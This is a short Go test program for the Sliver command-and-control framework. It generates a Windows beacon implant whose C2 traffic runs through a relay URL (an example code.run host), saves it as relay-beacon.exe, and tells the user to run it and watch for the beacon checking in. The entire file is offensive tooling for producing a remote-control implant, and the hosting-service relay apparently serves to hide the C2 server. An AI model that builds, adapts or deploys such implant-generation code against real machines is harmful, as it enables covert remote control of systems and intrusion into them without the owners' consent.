// Quick test: generate a beacon via relay URL, save it, report results.
package main

import (
	"flag"
	"fmt"
	"log"
	"os"

	"github.com/vite-ui/sliver-sdk/sliverapi"
)

func main() {
	cfgPath := flag.String("config", "", "operator .cfg path")
	relayURL := flag.String("relay", "", "relay URL (e.g. https://xxx.code.run)")
	flag.Parse()

	if *cfgPath == "" || *relayURL == "" {
		log.Fatal("usage: test-relay -config tester.cfg -relay https://xxx.code.run")
	}

	client, err := sliverapi.Connect(*cfgPath)
	if err != nil {
		log.Fatal(err)
	}
	defer client.Close()

	fmt.Printf("Generating beacon with C2: %s\n", *relayURL)
	cfg := sliverapi.DefaultGenerateConfig(*relayURL)
	cfg.Format = "exe"
	cfg.ObfuscateSymbols = false

	result, err := client.Generate(cfg)
	if err != nil {
		log.Fatal(err)
	}

	outPath := "relay-beacon.exe"
	if err := os.WriteFile(outPath, result.Data, 0o755); err != nil {
		log.Fatal(err)
	}

	fmt.Printf("Generated: %s (%d bytes / %.2f MB)\n", result.Name, result.Size, float64(result.Size)/(1024*1024))
	fmt.Printf("Saved to: %s\n", outPath)
	fmt.Println("\nRun it and check if beacon appears in sliver console or via SDK")
}
